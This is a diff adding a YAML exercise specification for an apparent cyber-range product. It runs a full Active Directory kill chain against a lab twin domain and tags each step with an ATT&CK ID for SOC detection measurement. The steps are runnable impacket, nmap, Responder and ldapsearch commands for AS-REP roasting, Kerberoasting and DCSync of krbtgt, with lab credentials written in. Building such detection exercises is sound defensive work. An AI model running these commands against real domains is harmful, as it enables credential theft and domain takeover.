@@ -1,0 +1,151 @@
+# Exercise-spec: the AD kill-chain (`exr` tier) against the `corp-enterprise`
+# twin. Part of the co-located corp-enterprise bundle
+# (docs/WORK_ORDER_corp_enterprise_bundle.md); see this folder's README.md for
+# the full deploy sequence.
+#
+# The kill chain (recon -> LLMNR poison -> SMB/LDAP enum -> AS-REP roast ->
+# Kerberoast -> DCSync), adapted from target-environments/ad-domain-lab, run
+# against corp-enterprise's live topology:
+#   - DC host `domain-controller`, IP 10.62.10.2 (server-vlan; the `gw` router
+#     takes server-vlan's .1 as its gateway leg, so the DC -- the next node on
+#     that segment -- gets .2). Domain: corp.axr.lab (twin_config.params.DOMAIN).
+#   - Attacker host `attacker` -- corp-enterprise's dedicated LAN-foothold node
+#     (on corp-lan, routed to server-vlan via the multi-homed `gw`), carrying
+#     the apt-sourced nmap/impacket/ldap-utils/smbclient toolkit the chain
+#     needs (no pip/git egress required). This replaces the Stage-5
+#     `egress-proxy` workaround: corp-enterprise now HAS an attacker node, so
+#     the run uses it directly (GAP-040 no longer forces the hand-provision).
+#   - Kerberoastable target: svc-sql / Summer2024! (SPN MSSQLSvc/sql01.corp.axr.lab:1433).
+#   - AS-REP-roastable target: jsmith (no pre-auth required).
+#   - DCSync/domain-admin target: bob-admin -- Domain Admins in corp-enterprise's
+#     base identity, no `password:` override, so the engine's lab-default domain
+#     password applies (Axr4nge-Lab!).
+#
+# `twin:` is the twin-config NAME (not a minted deploy id), resolved to the
+# newest live `corp-enterprise` te deploy at run time (exr name-targeting,
+# 2026-08-04) -- so this file is a checked-in library artifact, not one welded
+# to a dead deploy id. `axrange exr run <this file> --target corp-enterprise`
+# overrides it; `resolve_exercise_bindings` fails loud if the target resolves
+# to no live tier="te" deploy.
+exercise:
+  twin: corp-enterprise
+  attack:
+    activity:
+      id: ad-killchain-s5
+      host: attacker   # corp-enterprise's dedicated LAN attacker node (apt impacket/nmap/ldap kit)
+      actor: red-operator
+      inline:
+        steps:
+          # 0. CLOCK SYNC (operator prep, NOT an attack — no `technique:`, so
+          #    it emits no ATT&CK truth marker). The `corp-enterprise` DC runs
+          #    ~6h slow (docs/PRODUCT_GAPS.md GAP-037); the domain is internally
+          #    self-consistent (members sync FROM the DC), so only this
+          #    non-domain-joined attacker sees the skew — and Kerberos rejects a
+          #    pre-auth timestamp >5min off, which silently breaks step 6
+          #    (Kerberoast → KRB_AP_ERR_SKEW) while NTLM DCSync (7) and
+          #    no-preauth AS-REP roast (5) are immune (LES-194). Fix like a real
+          #    operator: MATCH the attacker to the target, never "fix" the DC.
+          #    Source the DC's time from an anonymous RootDSE `currentTime` read
+          #    (ldap-utils — already required by steps 4/6, no extra package)
+          #    and `date -u -s` to it. `set-ntp false` FIRST is load-bearing, or
+          #    systemd-timesyncd re-corrects the set within ~2s (verified live
+          #    2026-08-14 — without it the date-set silently reverts). Best-
+          #    effort + `; true`: an unreadable time leaves the clock as-is and
+          #    the chain still runs (Kerberoast then KRB_AP_ERR_SKEWs, exactly
+          #    as before this step existed). The durable fix is twin-level
+          #    (GAP-037's w32time work); matching the attacker is the attack-
+          #    path workaround, and step 8 restores the clock afterward.
+          - run: >-
+              timedatectl set-ntp false 2>/dev/null || true;
+              CT=$(ldapsearch -x -H ldap://10.62.10.2 -s base currentTime 2>/dev/null | sed -n 's/^currentTime: //p' | head -1);
+              D=$(printf '%s' "$CT" | sed -nE 's/^([0-9]{4})([0-9]{2})([0-9]{2})([0-9]{2})([0-9]{2})([0-9]{2}).*/\1-\2-\3 \4:\5:\6/p');
+              if [ -n "$D" ]; then date -u -s "$D" >/dev/null 2>&1 &&
+              echo "[axr] attacker clock synced to DC ($D UTC) for the Kerberos steps"; else
+              echo "[axr] DC currentTime unreadable via anon LDAP; skipping sync — Kerberos steps may KRB_AP_ERR_SKEW (GAP-037)"; fi; true
+          # 1. RECON — the AD service surface on the DC: DNS 53, Kerberos 88,
+          #    RPC 135, NetBIOS 139, LDAP 389, SMB 445, kpasswd 464, LDAPS
+          #    636, Global Catalog 3268, RDP 3389. A loud SYN sweep the SOC
+          #    should flag.
+          - tool: nmap
+            args: -Pn -n -sS -p 53,88,135,139,389,445,464,636,3268,3389
+            target: 10.62.10.2
+            technique: T1046
+          # 2. LLMNR / NBT-NS / mDNS poisoning — Responder answers broadcast
+          #    name lookups to capture NetNTLM hashes (the classic no-
+          #    credential entry). A 20s analyze/poison burst on corp-lan
+          #    (UDP 5355/137/5353). Best-effort: this twin's `attacker` node
+          #    does not stage Responder (no egress-gated pip/git step in a
+          #    twin-config-expanded scenario — see twin-configs/
+          #    corp-enterprise.yaml's `attacker` node comment), so this falls
+          #    straight to the "unavailable" branch — kept anyway so the
+          #    attempted LLMNR traffic itself still shows up on the wire for
+          #    the SOC/IDS to see, same as the source archetype's framing.
+          - run: >-
+              IF=$(ip route get 10.62.10.2 2>/dev/null | grep -oP 'dev \K\S+' | head -1);
+              timeout 20 python3 /opt/Responder/Responder.py -I "${IF:-eth0}" -A 2>&1 | tail -15 ||
+              echo "[axr] responder unavailable (not staged on this twin's attacker)"; true
+            technique: T1557.001
+          # 3. SMB enumeration — null/guest session: shares + password
+          #    policy + users. netexec (nxc) is not staged on this twin's
+          #    attacker (apt-only kit — see the node comment); smbclient
+          #    (apt) is the fallback path this always takes.
+          - run: >-
+              nxc smb 10.62.10.2 -u '' -p '' --shares --pass-pol --users 2>&1 | tail -40 ||
+              smbclient -N -L //10.62.10.2 2>&1 | tail -20; true
+            technique: T1087.002
+          # 4. LDAP enumeration — anonymous bind reveals the naming context
+          #    (and, on this deliberately-misconfigured DC, the SPN-bearing
+          #    account). LDAP 389; ldap-utils (apt).
+          - run: >-
+              ldapsearch -x -H ldap://10.62.10.2 -s base namingContexts 2>&1 | tail -15;
+              ldapsearch -x -H ldap://10.62.10.2 -b 'DC=corp,DC=axr,DC=lab'
+              '(servicePrincipalName=*)' sAMAccountName 2>&1 | tail -20; true
+            technique: T1087.002
+          # 5. AS-REP roasting — `jsmith` is flagged "do not require Kerberos
+          #    preauth" (twin-configs/corp-enterprise.yaml's identity
+          #    overlay) and returns an offline-crackable AS-REP. impacket
+          #    GetNPUsers over a user list; one Kerberos AS-REQ per user
+          #    (port 88). NOTE: Debian's python3-impacket ships GetNPUsers.py
+          #    under /usr/share/doc/.../examples (NOT in PATH, unlike
+          #    impacket-secretsdump) — invoke it by path.
+          - run: >-
+              IMPEX=/usr/share/doc/python3-impacket/examples;
+              printf 'jsmith\nsvc-sql\nalice\nbob-admin\nadministrator\nkrbtgt\n' > /tmp/ad_users.txt;
+              ( python3 "$IMPEX/GetNPUsers.py" corp.axr.lab/ -no-pass -usersfile /tmp/ad_users.txt -dc-ip 10.62.10.2 ||
+              GetNPUsers.py corp.axr.lab/ -no-pass -usersfile /tmp/ad_users.txt -dc-ip 10.62.10.2 ) 2>&1 | tail -25; true
+            technique: T1558.004
+          # 6. KERBEROASTING — authenticate as `svc-sql` (AS-REQ -> TGT) then
+          #    request a TGS for every SPN-bearing service account
+          #    (TGS-REQ); the TGS is offline-crackable. impacket
+          #    GetUserSPNs; Kerberos on 88. `svc-sql`'s password
+          #    (Summer2024!) is set directly on the identity overlay entry
+          #    (twin-configs/corp-enterprise.yaml).
+          - run: >-
+              IMPEX=/usr/share/doc/python3-impacket/examples;
+              ( python3 "$IMPEX/GetUserSPNs.py" corp.axr.lab/svc-sql:'Summer2024!' -dc-ip 10.62.10.2 -request ||
+              GetUserSPNs.py corp.axr.lab/svc-sql:'Summer2024!' -dc-ip 10.62.10.2 -request ) 2>&1 | tail -25; true
+            technique: T1558.003
+          # 7. DCSYNC — replicate secrets from the DC over DRSUAPI (the
+          #    domain-admin objective). With `bob-admin`'s over-privileged
+          #    Domain Admins cred (default lab password, Axr4nge-Lab! — no
+          #    `password:` override on that identity entry) this SUCCEEDS —
+          #    dumps krbtgt for a golden ticket. impacket-secretsdump (this
+          #    one IS in PATH). RPC 135 + high ports.
+          - run: >-
+              ( impacket-secretsdump corp.axr.lab/bob-admin:'Axr4nge-Lab!'@10.62.10.2 -just-dc-user krbtgt ||
+              python3 /usr/share/doc/python3-impacket/examples/secretsdump.py
+              corp.axr.lab/bob-admin:'Axr4nge-Lab!'@10.62.10.2 -just-dc-user krbtgt ) 2>&1 | tail -20; true
+            technique: T1003.006
+          # 8. CLEANUP (operator prep, NOT an attack — no `technique:`). Undo
+          #    step 0: re-enable NTP so the attacker's clock returns to
+          #    host/real time, leaving the box as the exercise found it. If
+          #    step 0 skipped (DC time unreadable), this is a harmless no-op.
+          #    Best-effort.
+          - run: >-
+              timedatectl set-ntp true 2>/dev/null || true;
+              systemctl restart systemd-timesyncd 2>/dev/null || true;
+              echo "[axr] attacker NTP re-enabled; clock returns to host/real time"; true
+
+  measurement:
+    run_label: ad-killchain-s5
+    techniques: [T1046, T1557.001, T1087.002, T1558.003, T1558.004, T1003.006]
